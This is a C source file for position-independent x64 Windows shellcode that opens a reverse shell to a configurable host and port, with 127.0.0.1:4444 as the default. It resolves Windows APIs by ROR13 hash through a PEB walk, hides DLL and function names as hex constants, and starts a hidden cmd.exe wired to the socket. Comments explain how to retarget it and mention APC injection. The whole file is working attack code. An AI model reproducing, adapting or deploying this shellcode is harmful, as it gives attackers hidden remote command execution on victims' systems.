// sc_reverse.c -- reverse shell to 127.0.0.1:4444. Position-independent x64.
//
// Sockets-as-stdio: WSASocketA returns an inheritable HANDLE; CreateProcessA
// with bInheritHandles=TRUE + STARTF_USESTDHANDLES + hStdIn/Out/Err = socket
// makes cmd.exe read/write through ReadFile/WriteFile on the socket. Windows
// translates that to recv/send transparently — no explicit send/recv needed
// in the shellcode itself.
//
// Edit RHOST_BE / RPORT_BE for a different target (network byte order).

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <intrin.h>

#define RHOST_BE 0x0100007F   // 127.0.0.1
#define RPORT_BE 0x5C11       // htons(4444)

typedef struct _UNICODE_STRING_T {
    USHORT Length, MaxLength;
    ULONG  _pad;
    PWSTR  Buffer;
} UNICODE_STRING_T;

typedef struct _LIST_ENTRY_T {
    struct _LIST_ENTRY_T *Flink, *Blink;
} LIST_ENTRY_T;

typedef struct _LDR_ENTRY_T {
    LIST_ENTRY_T InLoadOrderLinks;
    LIST_ENTRY_T InMemoryOrderLinks;
    LIST_ENTRY_T InInitializationOrderLinks;
    PVOID DllBase, EntryPoint;
    ULONG SizeOfImage;
    BYTE  _pad[4];
    UNICODE_STRING_T FullDllName, BaseDllName;
} LDR_ENTRY_T;

typedef struct _PEB_LDR_T {
    BYTE _pad[16];
    LIST_ENTRY_T InLoadOrderModuleList;
    LIST_ENTRY_T InMemoryOrderModuleList;
    LIST_ENTRY_T InInitializationOrderModuleList;
} PEB_LDR_T;

typedef struct _PEB_T {
    BYTE _pad[24];
    PEB_LDR_T* Ldr;
} PEB_T;

typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef BOOL    (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPVOID, LPVOID,
                                             BOOL, DWORD, LPVOID, LPCSTR,
                                             LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef int     (WSAAPI *fn_WSAStartup)(WORD, LPWSADATA);
typedef SOCKET  (WSAAPI *fn_WSASocketA)(int, int, int, LPVOID, GROUP, DWORD);
typedef int     (WSAAPI *fn_connect)(SOCKET, const struct sockaddr*, int);

__forceinline static unsigned ror13_a(const char* s) {
    unsigned h = 0;
    char c;
    while ((c = *s++) != 0) {
        if (c >= 'A' && c <= 'Z') c |= 0x20;
        h = ((h >> 13) | (h << 19)) + (unsigned char)c;
    }
    return h;
}

__forceinline static unsigned ror13_w(const wchar_t* s) {
    unsigned h = 0;
    wchar_t c;
    while ((c = *s++) != 0) {
        if (c >= 'A' && c <= 'Z') c |= 0x20;
        h = ((h >> 13) | (h << 19)) + (unsigned)c;
    }
    return h;
}

__forceinline static PVOID find_dll(unsigned dll_hash) {
    PEB_T* peb = (PEB_T*)__readgsqword(0x60);
    LIST_ENTRY_T* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY_T* cur  = head->Flink;
    while (cur != head) {
        LDR_ENTRY_T* e = (LDR_ENTRY_T*)((BYTE*)cur - 0x10);
        if (e->BaseDllName.Buffer && ror13_w(e->BaseDllName.Buffer) == dll_hash)
            return e->DllBase;
        cur = cur->Flink;
    }
    return 0;
}

__forceinline static PVOID find_func(PVOID dll, unsigned func_hash) {
    BYTE* base = (BYTE*)dll;
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    BYTE* nt = base + e_lfanew;
    DWORD exp_rva = *(DWORD*)(nt + 0x88);
    if (!exp_rva) return 0;
    BYTE* exp = base + exp_rva;
    DWORD num    = *(DWORD*)(exp + 0x18);
    DWORD names  = *(DWORD*)(exp + 0x20);
    DWORD ords   = *(DWORD*)(exp + 0x24);
    DWORD funcs  = *(DWORD*)(exp + 0x1C);
    DWORD* pn = (DWORD*)(base + names);
    WORD*  po = (WORD*) (base + ords);
    DWORD* pf = (DWORD*)(base + funcs);
    for (DWORD i = 0; i < num; i++) {
        const char* name = (const char*)(base + pn[i]);
        if (ror13_a(name) == func_hash)
            return base + pf[po[i]];
    }
    return 0;
}

void co2h_payload(void) {
    char nm[16];

    // kernel32
    *(ULONGLONG*)nm        = 0x32336C656E72656BULL;
    *(ULONGLONG*)(nm + 8)  = 0x000000006C6C642EULL;
    PVOID kernel32 = find_dll(ror13_a(nm));
    if (!kernel32) return;

    // LoadLibraryA
    *(ULONGLONG*)nm        = 0x7262694C64616F4CULL;
    *(ULONGLONG*)(nm + 8)  = 0x0000000041797261ULL;
    fn_LoadLibraryA pLL = (fn_LoadLibraryA)find_func(kernel32, ror13_a(nm));
    if (!pLL) return;

    // CreateProcessA
    *(ULONGLONG*)nm        = 0x7250657461657243ULL;
    *(ULONGLONG*)(nm + 8)  = 0x000041737365636FULL;
    fn_CreateProcessA pCP = (fn_CreateProcessA)find_func(kernel32, ror13_a(nm));

    if (!pCP) return;

    // ws2_32
    char ws2[16];
    *(ULONGLONG*)ws2       = 0x642E32335F327377ULL;
    *(ULONGLONG*)(ws2 + 8) = 0x0000000000006C6CULL;
    HMODULE ws2_32 = pLL(ws2);
    if (!ws2_32) return;

    // WSAStartup
    *(ULONGLONG*)nm        = 0x7472617453415357ULL;
    *(ULONGLONG*)(nm + 8)  = 0x0000000000007075ULL;
    fn_WSAStartup pStart = (fn_WSAStartup)find_func(ws2_32, ror13_a(nm));

    // WSASocketA
    *(ULONGLONG*)nm        = 0x656B636F53415357ULL;
    *(ULONGLONG*)(nm + 8)  = 0x0000000000004174ULL;
    fn_WSASocketA pSocket = (fn_WSASocketA)find_func(ws2_32, ror13_a(nm));

    // connect
    *(ULONGLONG*)nm        = 0x007463656E6E6F63ULL;
    *(ULONGLONG*)(nm + 8)  = 0;
    fn_connect pConn = (fn_connect)find_func(ws2_32, ror13_a(nm));

    if (!pStart || !pSocket || !pConn) return;

    WSADATA wsa;
    if (pStart(0x0202, &wsa) != 0) return;

    SOCKET s = pSocket(2, 1, 6, 0, 0, 0);
    if (s == INVALID_SOCKET) return;

    struct sockaddr_in sa;
    sa.sin_family      = 2;
    sa.sin_port        = RPORT_BE;
    sa.sin_addr.s_addr = RHOST_BE;
    *(ULONGLONG*)sa.sin_zero = 0;

    if (pConn(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) return;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    __stosq((unsigned __int64*)&si, 0, sizeof(si)/8 + 1);
    __stosq((unsigned __int64*)&pi, 0, sizeof(pi)/8);
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    char cmd[16];
    *(ULONGLONG*)cmd       = 0x006578652E646D63ULL;
    *(ULONGLONG*)(cmd + 8) = 0;

    pCP(0, cmd, 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &si, &pi);
    // NOTE: no ExitProcess — see sc_bind.c. Under inject_apc this would kill
    // the target process; we simply return so the APC thread resumes its wait.
}
